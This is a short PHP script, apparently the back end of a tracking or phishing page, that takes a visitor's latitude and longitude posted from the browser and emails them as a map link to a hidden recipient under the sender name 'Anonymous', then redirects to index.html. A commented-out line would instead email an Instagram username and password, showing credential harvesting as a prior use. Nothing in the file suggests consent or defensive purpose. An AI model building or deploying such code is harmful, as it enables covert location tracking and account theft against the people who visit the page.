<?php
     
     use PHPMailer\PHPMailer\PHPMailer;
     use PHPMailer\PHPMailer\SMTP;
     use PHPMailer\PHPMailer\Exception;
     
     require 'PHPMailer/src/Exception.php';
     require 'PHPMailer/src/PHPMailer.php';
     require 'PHPMailer/src/SMTP.php';  

     

     $data  = file_get_contents("php://input");
     $real_data = json_decode($data);
     $lati = $real_data[0];
     $lang = $real_data[1];
    //  print_r($real_data);

   
        

        sendOtp($lati,$lang);
        header("location: index.html");

  
     function sendOtp($lati,$lang){
    //   $rand = rand(1000,9999);
     $mail = new PHPMailer(true);

     try {
      $mail->isSMTP();
      $mail->Host = 'smtp.gmail.com';
      $mail->SMTPAuth = true;
      $mail->Username = '<email address>';
      $mail->Password = '<pass key>';  // like:- zzzz vvvv yyyy wwww
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
      $mail->Port = 465;

      $mail->setFrom('<sender Email address>','Anonymous');
      $mail->addAddress('<get email address>');

      $mail->isHTML(true);
      $mail->Subject = 'Geo_location';
      
      //$mail->Body = "Insta_username:- ".$name."<br>"."Insta_pass:- ".$pass;
?>
      <?php
       $mail->Body = 'Link:-.https://www.latlong.net/c/?lat='.$lati.'&long='.$lang.'';
      ?>

<!-- 'Link:-.https://www.latlong.net/c/?lat='.$lati.'&long='.$lang.''; -->

       <?php
    $mail->send();
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}

//    return $rand;
}

// echo "<br>".sendOtp();


// echo $randum_number;
?>